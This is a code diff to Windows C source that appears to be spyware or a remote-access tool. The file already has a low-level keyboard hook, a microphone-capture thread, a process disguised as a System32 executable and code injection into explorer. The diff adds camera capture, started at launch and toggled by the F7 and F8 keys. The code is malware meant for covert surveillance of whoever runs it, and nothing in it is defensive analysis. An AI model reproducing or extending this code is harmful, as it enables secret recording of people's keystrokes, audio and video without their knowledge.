@@ -3,6 +3,8 @@
 HHOOK g_ouk;
 volatile int g_micro_run = 0;
 
+volatile int g_camera_run = 0;
+
 DWORD WINAPI thread_micro(LPVOID lp)
 {
 	while(1)
@@ -15,6 +17,7 @@ DWORD WINAPI thread_micro(LPVOID lp)
 	}
 	return 0;
 }
+
 
 
 void *which_open(char *exe)
@@ -75,6 +78,16 @@ LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
 			printf("MICRO DESCATIVER CHEF!\n");
 			g_micro_run = 0 ;
 		}
+		if (kbd->vkCode == VK_F8)
+		{
+			printf("CAMERA ACTIVER CHEF!\n");
+			g_camera_run = 1;
+		}
+		if (kbd->vkCode == VK_F7)
+		{
+			printf("CAMERA DESACTIVER CHEF\n");
+			g_camera_run = 0;
+		}
 		which_open(exe);
 		if (!allow_app(exe))
 			return (CallNextHookEx(g_ouk, ncode, wp, lp));
@@ -125,6 +138,7 @@ int main(void)
 {
 	disguise_process_name(L"C:\\Windows\\System32\\host.exe");
 	HANDLE h = CreateThread(NULL, 0, thread_micro, NULL, 0, NULL);
+	start_camera();
 	if (inject_into_explorer())
 		return 0;
 	run_winkey();
